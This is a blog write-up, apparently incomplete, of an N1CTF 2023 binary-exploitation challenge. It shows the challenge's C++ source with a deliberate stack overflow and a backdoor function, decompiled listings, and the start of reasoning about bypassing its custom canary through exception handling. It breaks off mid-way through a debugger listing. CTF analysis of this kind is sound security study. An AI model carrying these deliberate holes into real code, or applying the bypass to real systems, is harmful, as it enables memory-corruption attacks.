<!DOCTYPE html>
<html class="" lang="en-us"><head>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

<title>
        
            N1CTF 2023 Writeups  &ndash;
        
        My New Hugo Site
    </title>

    
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>

    
    
    <link type="text/css" rel="stylesheet" href="https://w1n-gl0ry.github.io/css/styles.6f84514ad632600fba315252a38e35f30218f3d5ec268c1236f62782176917002e704c2b142a2d949bd831c6feabc3d6db35a3c6d6e151b839b9fe80cc19fa4f.css" />
<meta name="author" content="" />

    
        <meta name="keywords" content='ctf' />
    
    
        <meta name="description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
    

<meta property="og:site_name"
    content='My New Hugo Site' />

    <meta property="og:title" content="N1CTF 2023 Writeups" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="" />
    <meta
        property="article:published_time"
        content='2023-08-20T17:37:11Z&#43;0800' />
    
        
            <meta property="article:tag" content="ctf" />
        
    
    <meta property="og:url" content="https://example.org/posts/my-first-post/" />
    
    
    <meta property="og:image"
        content="https://example.org/img/icon.svg" />
    
        <meta property="og:description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='example.org'
/>
<meta property="twitter:url" content="https://example.org/posts/my-first-post/" />


    <meta name="twitter:title" content="N1CTF 2023 Writeups" />
    
    
    
    <meta name="twitter:image"
        content="https://example.org/img/icon.svg" />
    
        <meta name="twitter:description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' alt='Logo'/>
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">My New Hugo Site</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts/">Posts</a></li>
        
        
        
        
        
        
        
            <li><a href="/tags/">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search/?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="/index.xml">
    
    
        &#xf09e;
    
    <span>
        RSS
    </span>
</a>

        
        
    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>N1CTF 2023 Writeups</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2023-08-20

</p>
    
    
    
    <div class="articleToc">
    <nav id="TableOfContents"></nav>
    <hr />
</div>

    <div><h1 id="introduction">Introduction</h1>
<p>Rating weight: 97,33</p>
<p>During weekends, I played the N1CTF contest with my teammate <code>cauca</code>. We ranked in the top 45 and I solved 1/4 of the problems in the <code>PWN</code> category.</p>
<p><img src="https://hackmd.io/_uploads/Byh_XerIT.png" alt="image"></p>
<h1 id="overview">Overview</h1>
<p>After the contest, I asked the author for the source of the challenge to make it easier to debug.
<code>main.cpp</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;sys/random.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;utils.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstring&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;memory&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">constexpr</span> size_t CANARY_RANDBITS <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">constexpr</span> size_t CANARY_SHIFTBITS <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">constexpr</span> size_t CANARY_POOL_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> CANARY_RANDBITS;
</span></span><span style="display:flex;"><span>u64 user_canary[CANARY_POOL_SIZE];
</span></span><span style="display:flex;"><span>u64 sys_canary[CANARY_POOL_SIZE];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span>size_t SIZE<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">ProtectedBuffer</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[SIZE];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  u64 canary;
</span></span><span style="display:flex;"><span>  ProtectedBuffer() {
</span></span><span style="display:flex;"><span>    bzero(buf, <span style="color:#66d9ef">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> getCanary();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  u64 <span style="color:#a6e22e">getCanary</span>() {
</span></span><span style="display:flex;"><span>    u64 addr <span style="color:#f92672">=</span> (u64)<span style="color:#66d9ef">this</span>;
</span></span><span style="display:flex;"><span>    u64 canary_idx <span style="color:#f92672">=</span> (addr <span style="color:#f92672">&gt;&gt;</span> CANARY_SHIFTBITS) <span style="color:#f92672">&amp;</span> (CANARY_POOL_SIZE <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    u64 raw_canary <span style="color:#f92672">=</span> user_canary[canary_idx] <span style="color:#f92672">^</span> sys_canary[canary_idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> raw_canary;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (canary <span style="color:#f92672">!=</span> getCanary()) {
</span></span><span style="display:flex;"><span>      raise(<span style="color:#e6db74">&#34;*** stack smash detected ***&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">typename</span> Fn<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">void</span> mut(Fn <span style="color:#66d9ef">const</span> <span style="color:#f92672">&amp;</span>fn) {
</span></span><span style="display:flex;"><span>    fn(buf);
</span></span><span style="display:flex;"><span>    check();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_canary</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">sizeof</span>(sys_canary) <span style="color:#f92672">!=</span> getrandom(sys_canary, <span style="color:#66d9ef">sizeof</span>(sys_canary), <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>    raise(<span style="color:#e6db74">&#34;canary init error&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;To increase entropy, give me your canary&#34;</span>);
</span></span><span style="display:flex;"><span>  readall(user_canary);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">UnsafeApp</span> {
</span></span><span style="display:flex;"><span>  UnsafeApp() { puts(<span style="color:#e6db74">&#34;creating dangerous app...&#34;</span>); }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">virtual</span> <span style="color:#f92672">~</span>UnsafeApp() {}
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">launch</span>() <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">BOFApp</span> <span style="color:#f92672">:</span> UnsafeApp {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">launch</span>() <span style="color:#66d9ef">override</span> {
</span></span><span style="display:flex;"><span>    ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span> buf;
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;input something to pwn :)&#34;</span>);
</span></span><span style="display:flex;"><span>    buf.mut([](<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p) { scanf(<span style="color:#e6db74">&#34;%[^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">]&#34;</span>, p); });
</span></span><span style="display:flex;"><span>    puts(buf.buf);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">backdoor</span>() { system(<span style="color:#e6db74">&#34;/readflag&#34;</span>); }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>  setbuf(stdin, <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>  setbuf(stdout, <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>  init_canary();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> app <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>make_unique<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">-&gt;</span>launch();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (...) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;error!!!&#34;</span>);
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>utils.h</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#pragma once
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdlib&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdexcept&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> u64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">raise</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>msg) {
</span></span><span style="display:flex;"><span>  puts(msg);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">throw</span> std<span style="color:#f92672">::</span>runtime_error(msg);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readall</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr, size_t size) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)ptr;
</span></span><span style="display:flex;"><span>  size_t tot <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (tot <span style="color:#f92672">&lt;</span> size) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> res <span style="color:#f92672">=</span> read(STDIN_FILENO, p <span style="color:#f92672">+</span> tot, size <span style="color:#f92672">-</span> tot);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (res <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>      raise(<span style="color:#e6db74">&#34;IO error&#34;</span>);
</span></span><span style="display:flex;"><span>    tot <span style="color:#f92672">+=</span> res;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">typename</span> T<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> readall(T <span style="color:#f92672">&amp;</span>dest) {
</span></span><span style="display:flex;"><span>  readall(<span style="color:#f92672">&amp;</span>dest, <span style="color:#66d9ef">sizeof</span>(dest));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The author of the challenge has implemented a custom canary, as the title suggests.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_canary</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">sizeof</span>(sys_canary) <span style="color:#f92672">!=</span> getrandom(sys_canary, <span style="color:#66d9ef">sizeof</span>(sys_canary), <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>    raise(<span style="color:#e6db74">&#34;canary init error&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;To increase entropy, give me your canary&#34;</span>);
</span></span><span style="display:flex;"><span>  readall(user_canary);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In main function, an object was actually instantiated and other subsequent functions were called.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v5[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  setbuf(stdin, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  setbuf(_bss_start, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  init_canary();
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>make_unique<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span>(v5);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">-&gt;</span>(v5);
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>))(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)v3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16LL</span>))(v3);
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::~</span>unique_ptr(v5);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I have located the destructor for this object, which will invoke the function pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> a2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( a2 )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>))(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)a2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8LL</span>))(a2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The main function will invoke the <code>BOFApp::launch</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> BOFApp<span style="color:#f92672">::</span>launch(BOFApp <span style="color:#f92672">*</span><span style="color:#66d9ef">this</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> v2; <span style="color:#75715e">// [rsp+1Fh] [rbp-61h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">88</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-60h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+78h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>ProtectedBuffer(s);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;input something to pwn :)&#34;</span>);
</span></span><span style="display:flex;"><span>  ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>mut<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">::</span>launch(<span style="color:#66d9ef">void</span>)<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">&gt;</span>(s, <span style="color:#f92672">&amp;</span>v2);
</span></span><span style="display:flex;"><span>  puts(s);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v4 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span></code></pre></div><p>It&rsquo;s look safe, we continue in mut function, it take a function as a argument</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>_int64 <span style="color:#66d9ef">__fastcall</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>mut<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">::</span>launch(<span style="color:#66d9ef">void</span>)<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  BOFApp<span style="color:#f92672">::</span>launch(<span style="color:#66d9ef">void</span>)<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">::</span><span style="color:#66d9ef">operator</span>()(a2, a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check(a1);
</span></span><span style="display:flex;"><span>}    
</span></span></code></pre></div><p>Through debugging, we can see that there is a stack overflow vulnerability in the function that was called because it calls to <code>scanf(&quot;%[^\n]&quot;, p)</code> and doesn&rsquo;t check the boundary</p>
<p>But it isn&rsquo;t easy to use a normal BOF attack, because it calls the function  <code>ProtectedBuffer&lt;64ul&gt;:: check(a1)</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">__fastcall</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check(<span style="color:#66d9ef">__int64</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">bool</span> result; <span style="color:#75715e">// al
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">72</span>);
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> v1 <span style="color:#f92672">!=</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>getCanary(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( result )
</span></span><span style="display:flex;"><span>    raise(<span style="color:#e6db74">&#34;*** stack smash detected ***&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If we cannot bypass this, it will trigger a stack smash error. We&rsquo;ll address it later.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">backdoor</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> system(<span style="color:#e6db74">&#34;/readflag&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I see a <code>backdoor</code> function. How can we call it without bypassing the canary?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> app <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>make_unique<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">-&gt;</span>launch();
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (...) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;error!!!&#34;</span>);
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>When the check fails, the program will print <code>*** stack smash detected ***</code> using the <code>raise()</code> function. In this case, the program will look for a catch statement to handle the exception and prevent the program from crashing.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">──────────────────────────────────────────────────────────────────────────</span>[ DISASM <span style="color:#f92672">/</span> x86<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span> <span style="color:#f92672">/</span> set emulate on ]<span style="color:#960050;background-color:#1e0010">───────────────────────────────────────────────────────────────────────────</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4018f2</span> <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>    setne  al
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x4018f5</span> <span style="color:#f92672">&lt;</span>ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check()<span style="color:#f92672">+</span><span style="color:#ae81ff">43</span><span style="color:#f92672">&gt;</span>    test   al, al
